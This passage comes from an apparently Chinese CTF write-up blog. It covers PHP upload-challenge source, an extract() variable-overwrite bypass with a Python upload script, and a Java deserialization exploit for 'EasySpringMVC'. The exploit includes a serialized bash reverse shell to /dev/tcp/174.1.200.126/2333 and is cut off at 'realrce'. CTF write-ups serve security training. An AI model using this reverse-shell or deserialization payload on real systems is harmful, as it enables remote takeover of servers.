&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&#x27;&gt;&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">  选择图片：&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span><br><span class="hljs-string">  &lt;input type=&quot;submit&quot; value=&quot;上传&quot;&gt;&lt;/form&gt;</span><br><span class="hljs-string">  &#x27;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) &#123;<br>      <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="hljs-variable">$filename</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$filename</span>)) &#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;图片上传成功!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;failed&#x27;</span>);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;md5&quot;</span>)&#123;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$filename</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">FILE</span>(<span class="hljs-variable">$filename</span>);<br>          <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] !== <span class="hljs-string">&quot;remove&quot;</span> &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] !== <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;remove&quot;</span>) &#123;<br>              <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">remove</span>();<br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;<br>          &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;todo&#x27;</span>] === <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>              <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br>          &#125;<br>      &#125;<br>  &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h2 id="ezsign"><a href="#ezsign" class="headerlink" title="ezsign"></a>ezsign</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php.bak</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">// 检查 cookie 中是否有 token</span><br><span class="hljs-variable">$token</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;token&#x27;</span>] ?? <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$token</span>)&#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$token</span>);<br>    <span class="hljs-variable">$token</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$token</span>, <span class="hljs-literal">true</span>);<br><br><br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$isLocal</span> = <span class="hljs-literal">false</span>;<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&quot;127.0.0.1&quot;</span>)&#123;<br>        <span class="hljs-variable">$isLocal</span> = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$isLocal</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome Back，&#x27;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;!&#x27;</span>;<br>        <span class="hljs-comment">//如果 upload 目录下存在$username.png文件，则显示图片</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>            <span class="hljs-comment">// 显示图片，缩小图片</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;upload/&#x27;</span> . <span class="hljs-variable">$username</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$token</span>[<span class="hljs-string">&#x27;filename&#x27;</span>] .<span class="hljs-string">&#x27;&quot; width=&quot;200&quot;&gt;&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;请上传您高贵的头像。&#x27;</span>;<br>            <span class="hljs-comment">// 写一个上传头像的功能</span><br>            <span class="hljs-variable">$html</span> = <span class="hljs-string">&lt;&lt;&lt;EOD</span><br><span class="hljs-string">            &lt;form method=&quot;post&quot; action=&quot;upload.php&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;</span><br><span class="hljs-string">                &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="hljs-string">            &lt;/form&gt;</span><br><span class="hljs-string">            EOD</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$html</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// echo &quot;留个言吧&quot;;</span><br>        <span class="hljs-variable">$html</span> = <span class="hljs-string">&lt;&lt;&lt;EOD</span><br><span class="hljs-string">        &lt;h1&gt;留言板&lt;/h1&gt;</span><br><span class="hljs-string">        &lt;label for=&quot;input-text&quot;&gt;Enter some text:&lt;/label&gt;</span><br><span class="hljs-string">        &lt;input type=&quot;text&quot; id=&quot;input-text&quot; placeholder=&quot;Type here...&quot;&gt;</span><br><span class="hljs-string">        &lt;button onclick=&quot;displayInput()&quot;&gt;Display&lt;/button&gt;</span><br><span class="hljs-string">        EOD</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$html</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$html</span> = <span class="hljs-string">&lt;&lt;&lt;EOD</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;h2&gt;Login&lt;/h2&gt;</span><br><span class="hljs-string">    &lt;form method=&quot;post&quot; action=&quot;./login.php&quot;&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; required&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">EOD</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$html</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;script&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayInput</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> inputText = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;input-text&quot;</span>).value;<br>      document.<span class="hljs-title function_ invoke__">write</span>(inputText)<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>首先存在<code>extract()</code>变量覆盖，然后要求<code>$isLocal</code>为真才能进上传界面。两种解法:</p><ul><li><p>利用变量覆盖先让<code>$isLocal=true</code>即<code>?_SERVER[REMOTE_ADDR]=127.0.0.1</code>进上传文件界面，然后<code>upload</code>文件夹</p></li><li><p>第二种方法就直接写个脚本用表单上传：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.qsnctf.com:30074/upload.php&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;TOKEN=65794a3163325679626d46745a534936496a45694c434169644739725a5734694f694a6a4e474e684e44497a4f474577596a6b794d7a67794d47526a597a55774f5745325a6a63314f4451355969497349434a70633139685a473170626949364d48303d; token=eyJ1c2VybmFtZSI6Ii4uIiwicGFzc3dvcmQiOiIxIiwiZmlsZW5hbWUiOiJ0eHkucG5nIn0%3d&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-number">1</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;txy.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>&#125;<br>r = requests.post(url,data=data,files=file,headers=headers)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>首先<code>Tools</code>类下存在很明显的反序列化+命令执行：</p><p><img src="/img/spring_mvc_1.png" alt="spring_mvc_1"></p><p>找哪里调用了这个<code>parse</code>，看<code>ClentInfoFilter.class</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClentInfoFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ClentInfoFilter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig fcg)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        Cookie[] cookies = ((HttpServletRequest)request).getCookies();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">exist</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            Cookie[] var7 = cookies;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> cookies.length;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var9 &lt; var8; ++var9) &#123;<br>                <span class="hljs-type">Cookie</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> var7[var9];<br>                <span class="hljs-keyword">if</span> (c.getName().equals(<span class="hljs-string">&quot;cinfo&quot;</span>)) &#123;<br>                    exist = <span class="hljs-literal">true</span>;<br>                    cookie = c;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] bytes;<br>        <span class="hljs-keyword">if</span> (exist) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> cookie.getValue();<br>            Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>            bytes = decoder.decode(b64);<br>            <span class="hljs-type">ClientInfo</span> <span class="hljs-variable">cinfo</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">if</span> (!b64.equals(<span class="hljs-string">&quot;&quot;</span>) &amp;&amp; bytes != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    cinfo = (ClientInfo)Tools.parse(bytes);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var14) &#123;<br>                    var14.printStackTrace();<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cinfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClientInfo</span>(<span class="hljs-string">&quot;Anonymous&quot;</span>, <span class="hljs-string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId());<br>                Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    bytes = Tools.create(cinfo);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var15) &#123;<br>                    var15.printStackTrace();<br>                &#125;<br><br>                cookie.setValue(encoder.encodeToString(bytes));<br>            &#125;<br><br>            ((HttpServletRequest)request).getSession().setAttribute(<span class="hljs-string">&quot;cinfo&quot;</span>, cinfo);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClientInfo</span> <span class="hljs-variable">cinfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClientInfo</span>(<span class="hljs-string">&quot;Anonymous&quot;</span>, <span class="hljs-string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId());<br>                bytes = Tools.create(cinfo);<br>                cookie = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;cinfo&quot;</span>, encoder.encodeToString(bytes));<br>                cookie.setMaxAge(<span class="hljs-number">86400</span>);<br>                ((HttpServletResponse)response).addCookie(cookie);<br>                ((HttpServletRequest)request).getSession().setAttribute(<span class="hljs-string">&quot;cinfo&quot;</span>, cinfo);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var13) &#123;<br>                var13.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        chain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/spring_mvc_2.png" alt="spring_mvc_2"></p><p>所以这里构造一个恶意的<code>cookie</code>传进去就行，通过重写<code>writeObject</code>方法进行命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tools;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> ois.readObject();<br>  &#125;<br>  <span class="hljs-keyword">private</span> String testCall;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>    outputStream.writeObject(obj);<br>    <span class="hljs-keyword">return</span> bos.toByteArray();<br>  &#125;<br>  <br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> in.readObject();<br>    (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>((String[])obj)).start();<br>  &#125;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>    String command[]=&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i&gt;&amp; /dev/tcp/174.1.200.126/2333 0&gt;&amp;1&quot;</span>&#125;;<br>    out.writeObject(command);<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>Main.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tools;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> com.tools.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Tools</span> <span class="hljs-variable">cinfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tools</span>();<br>            <span class="hljs-type">byte</span>[] bytes = Tools.create(cinfo);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> encoder.encodeToString(bytes);<br>            System.out.println(payload);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 